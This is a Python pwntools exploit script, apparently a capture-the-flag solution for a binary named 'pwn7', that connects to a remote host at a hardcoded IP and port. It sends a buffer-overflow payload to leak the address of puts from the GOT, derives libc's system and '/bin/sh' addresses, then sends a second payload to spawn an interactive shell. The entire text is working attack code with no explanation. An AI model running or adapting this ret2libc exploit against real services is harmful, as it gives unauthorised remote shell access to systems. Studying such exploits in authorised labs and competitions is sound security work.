from pwn import *

#context.log_level = 'debug'

#p = process('./pwn7')
p = remote('128.199.220.74', 10007)
p_elf = ELF('pwn7')
libc_elf = ELF('libc.so.6_pwn7')

################ First #####################
p.recvuntil('-\n')

puts_got_addr = p_elf.got['puts']
main_entry = 0x80484a5
payload = p32(puts_got_addr) + 'a'*16
payload += p32(main_entry)

p.sendline(payload)

puts_entry = int(p.recvline(False), 16)
############### Done #######################

puts_offset = libc_elf.symbols['puts']
system_offset = libc_elf.symbols['system']
binsh_offset = list(libc_elf.search('/bin/sh'))[0]

system_entry = puts_entry - (puts_offset - system_offset)
binsh_addr = puts_entry - (puts_offset - binsh_offset)

payload = p32(puts_got_addr) + 'a'*16
payload += p32(system_entry) + 'a'*4
payload += p32(binsh_addr)

################ Second ###################
p.sendline(payload)
p.recvline()

p.interactive()
